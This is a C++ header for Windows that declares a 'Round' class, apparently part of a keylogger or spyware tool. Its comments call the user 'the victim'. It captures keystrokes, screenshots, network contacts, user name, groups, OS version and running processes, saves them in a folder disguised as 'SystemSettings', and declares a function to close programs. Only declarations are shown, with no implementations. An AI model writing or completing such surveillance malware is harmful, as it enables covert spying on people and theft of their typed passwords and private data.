#pragma once

#include <stdio.h>
#include <conio.h>
#include <windows.h>
#include <winuser.h>
#include <string>
#include <iostream>
#include <fstream>
#include <queue>
#include <vector>
#include <chrono>
#include <thread>
#include <Lmcons.h>
#include <sstream>
#include <VersionHelpers.h>
#include <atlimage.h>
#include <functional>
#include <direct.h>
#include <stdlib.h>
#include <errno.h>

//#include <InetSDK.h>
//#include <winsock2.h>
//#include <WS2tcpip.h>
//#include <wsipv6ok.h>
//#include <WinDNS.h>

#include <exception>

using std::string;
using std::ofstream;
using std::queue;
using std::vector;
using std::exception;
using std::thread;

const string PATH[2] = { "C:\\Users\\", "\\Documents" };
const string FOLDER_NAME = "SystemSettings";

//the class collects the data of a computer for a limited time. when distructed, it writes all the data to a file
class Round
{
private:
	static int amountOfRounds;
	bool _runThreads;
	vector<thread> threads;

	queue<string> _keyStrokes; // the key presses of the victim
	CImage _screenshot;
	vector<string> _activeIpAddresses; // ip addresses that the machine talks with
	string _currentUserName; // name of connected user
	vector<string> _groups;
	string _systemVersion; // the version of the operating system
	vector<string> _processes; // the processes that runs on the machine
	string _hostIp; // the ip of the current computer
	
	string _outputFileName;

	void detectKeyStrokes(); // thread
	void takeScreenshot();
	void findActiveIpAddresses();
	void findHostUsername();
	void findGroups();
	void findSystemVersion();
	void detectProcesses();
	void findHostIp();
	void closePrograms();

	//-----temp functions ------
	static std::string execute(std::string cmd, std::string fileName);
	static string getPrintableKey(int keyCode);
	static std::string castVkeyToString(unsigned int vkey);

public:
	Round(string outputFileName);
	~Round(); // the d'tor writes all the data to the file

	void operator ()();
};